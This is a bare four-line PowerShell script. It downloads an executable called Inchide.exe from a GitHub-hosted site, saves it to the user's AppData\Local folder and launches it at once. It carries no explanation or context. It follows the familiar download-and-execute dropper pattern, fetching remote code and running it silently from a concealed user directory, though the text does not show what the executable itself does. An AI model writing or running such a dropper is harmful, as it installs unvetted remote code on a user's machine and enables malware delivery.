$x = "https://github.com/webntdev/webntdev.github.io/raw/main/Inchide/Inchide.exe"
$y = "$env:USERPROFILE\AppData\Local\inchide.exe"

Invoke-WebRequest -Uri $x -OutFile $y
Start-Process $y
